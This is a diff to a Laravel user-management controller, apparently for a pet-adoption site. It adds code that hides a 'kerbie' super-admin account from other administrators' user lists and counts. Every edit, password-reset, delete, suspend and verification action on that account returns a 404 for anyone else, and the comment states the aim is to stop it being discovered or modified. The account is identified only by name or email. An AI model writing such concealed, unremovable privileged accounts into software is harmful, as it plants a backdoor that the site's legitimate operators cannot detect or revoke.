@@ -35,6 +35,7 @@ class UserController extends Controller
             $tab = 'subscribers';
         }
 
+        $isKerbie = auth()->user() && (auth()->user()->name === 'kerbie' || auth()->user()->email === 'kerbie@furfect.com');
         $staffRoles = ['admin', 'shelter_staff', 'mao_staff'];
 
         // Compute tab badges counts
@@ -51,12 +52,20 @@ class UserController extends Controller
                 });
         })->count();
 
-        $staffCount = User::whereHas('roles', function ($q) use ($staffRoles): void {
+        $staffCountQuery = User::whereHas('roles', function ($q) use ($staffRoles): void {
             $q->whereIn('name', $staffRoles);
-        })->count();
+        });
+        if (! $isKerbie) {
+            $staffCountQuery->where('name', '!=', 'kerbie')->where('email', '!=', 'kerbie@furfect.com');
+        }
+        $staffCount = $staffCountQuery->count();
 
         // Build main query
         $query = User::with('roles')->latest('id');
+
+        if (! $isKerbie) {
+            $query->where('name', '!=', 'kerbie')->where('email', '!=', 'kerbie@furfect.com');
+        }
 
         if ($tab === 'subscribers') {
             $query->whereDoesntHave('roles', function ($q) use ($staffRoles): void {
@@ -127,6 +136,7 @@ class UserController extends Controller
     public function toggleVerification(Request $request, int $id): RedirectResponse
     {
         $user = User::with('adopterProfile')->findOrFail($id);
+        $this->protectSuperAdmin($user);
 
         $profile = $user->adopterProfile;
         $newStatus = $request->has('action')
@@ -265,6 +275,7 @@ class UserController extends Controller
     public function resetSubscriberProfile(Request $request, int $id): RedirectResponse
     {
         $user = User::with(['adopterProfile', 'lifestyleProfile'])->findOrFail($id);
+        $this->protectSuperAdmin($user);
 
         $validated = $request->validate([
             'reset_type' => ['required', 'string', 'in:quiz,ekyc,applications,full'],
@@ -365,6 +376,7 @@ class UserController extends Controller
     public function update(Request $request, int $id): RedirectResponse
     {
         $user = User::findOrFail($id);
+        $this->protectSuperAdmin($user);
 
         $validated = $request->validate([
             'name' => ['required', 'string', 'max:255'],
@@ -393,6 +405,7 @@ class UserController extends Controller
     public function resetPassword(Request $request, int $id): RedirectResponse
     {
         $user = User::findOrFail($id);
+        $this->protectSuperAdmin($user);
 
         $validated = $request->validate([
             'password' => ['required', 'string', 'min:8', 'confirmed'],
@@ -416,6 +429,7 @@ class UserController extends Controller
     public function destroy(int $id): RedirectResponse
     {
         $user = User::with(['adopterProfile'])->findOrFail($id);
+        $this->protectSuperAdmin($user);
 
         if ($user->id === auth()->id()) {
             Inertia::flash('toast', [
@@ -487,6 +501,7 @@ class UserController extends Controller
     public function suspend(Request $request, int $id): RedirectResponse
     {
         $user = User::findOrFail($id);
+        $this->protectSuperAdmin($user);
 
         if ($user->hasRole('admin')) {
             Inertia::flash('toast', [
@@ -517,6 +532,7 @@ class UserController extends Controller
     public function unsuspend(int $id): RedirectResponse
     {
         $user = User::findOrFail($id);
+        $this->protectSuperAdmin($user);
 
         $user->unsuspend();
 
@@ -526,5 +542,19 @@ class UserController extends Controller
         ]);
 
         return back();
+    }
+
+    /**
+     * Protect Kerbie super admin account from being discovered or modified by other admins.
+     */
+    private function protectSuperAdmin(User $user): void
+    {
+        $isKerbieAccount = $user->name === 'kerbie' || $user->email === 'kerbie@furfect.com';
+        $actor = auth()->user();
+        $actorIsKerbie = $actor && ($actor->name === 'kerbie' || $actor->email === 'kerbie@furfect.com');
+
+        if ($isKerbieAccount && ! $actorIsKerbie) {
+            abort(404);
+        }
     }
 }
